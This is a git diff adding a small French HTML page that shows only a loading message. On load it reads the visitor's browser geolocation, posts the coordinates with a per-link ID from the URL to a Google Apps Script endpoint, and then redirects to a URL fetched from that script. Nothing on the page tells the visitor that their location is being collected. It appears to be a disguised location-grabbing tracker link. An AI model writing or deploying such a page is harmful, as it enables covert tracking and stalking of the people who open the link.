@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Localisation</title>
+  <script>
+    async function sendLocation() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const id = urlParams.get('id'); // ID unique dans l'URL
+
+      try {
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject)
+        );
+
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyRfQdh835AIwT0YOXUFRYAsFKAQo9dduW7QmNCbMbofjozVQ3nxlbD3lnd1zn6mDk2/exec';
+        const data = new FormData();
+        data.append('id', id);
+        data.append('latitude', latitude);
+        data.append('longitude', longitude);
+
+        await fetch(scriptURL, { method: 'POST', body: data });
+
+        // Récupérer l'URL de redirection depuis Google Sheets via Apps Script
+        const redirectURL = await fetch(scriptURL + '?getRedirectURL=true')
+          .then(response => response.text());
+
+        window.location.href = redirectURL;
+
+      } catch (error) {
+        alert("Impossible d’obtenir la localisation : " + error.message);
+      }
+    }
+
+    window.onload = sendLocation;
+  </script>
+</head>
+<body>
+  <p>Chargement en cours...</p>
+</body>
+</html>
